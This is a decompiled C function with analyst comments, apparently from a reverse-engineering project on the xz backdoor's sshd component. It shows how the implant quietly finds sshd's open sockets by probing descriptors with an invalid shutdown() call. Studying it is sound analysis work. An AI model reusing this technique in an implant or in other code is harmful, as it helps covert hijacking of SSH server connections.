// /home/kali/xzre-ghidra/xzregh/107BC0_sshd_get_usable_socket.c
// Function: sshd_get_usable_socket @ 0x107BC0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_get_usable_socket(int * pSock, int socket_index, libc_imports_t * imports)


/*
 * AutoDoc: Brute-force walks file descriptors 0–63 and probes each with `shutdown(fd, 0x7fffffff)` (an intentionally invalid `how` value). `EINVAL` (invalid `how`) or `ENOTCONN` are treated as evidence the descriptor is a socket without mutating its state. Each match increments a counter, and once it reaches `socket_index` the helper returns that fd so callers can recycle sshd’s sockets even if the monitor struct was never recovered.
 */

#include "xzre_types.h"

BOOL sshd_get_usable_socket(int *pSock,int socket_index,libc_imports_t *imports)

{
  int shutdown_status;
  int *errno_ptr;
  int sockfd;
  int matches_seen;
  int fake_errno;
  
  if (pSock == (int *)0x0) {
    return FALSE;
  }
  if (imports != (libc_imports_t *)0x0) {
    matches_seen = -1;
    sockfd = 0;
    do {
      fake_errno = 0;
      if ((imports->shutdown != (pfn_shutdown_t)0x0) &&
         (imports->__errno_location != (pfn___errno_location_t)0x0)) {
        // AutoDoc: Probe each descriptor with an intentionally invalid `how` value; sockets return `EINVAL` (or `ENOTCONN`) without needing a real shutdown.
        shutdown_status = (*imports->shutdown)(sockfd,0x7fffffff);
        if (shutdown_status < 0) {
          // AutoDoc: Sample errno after failures so we can distinguish usable sockets from closed descriptors.
          errno_ptr = (*imports->__errno_location)();
LAB_00107c21:
          // AutoDoc: Only descriptors that raise EINVAL or ENOTCONN count as "usable".
          if ((*errno_ptr != 0x16) && (*errno_ptr != 0x6b)) goto LAB_00107c40;
        }
        else {
          errno_ptr = &fake_errno;
          if (shutdown_status != 0) goto LAB_00107c21;
        }
        matches_seen = matches_seen + 1;
        // AutoDoc: Return the fd once we’ve reached the requested ordinal.
        if (matches_seen == socket_index) {
          *pSock = sockfd;
          return TRUE;
        }
      }
LAB_00107c40:
      sockfd = sockfd + 1;
    } while (sockfd != 0x40);
  }
  return FALSE;
}

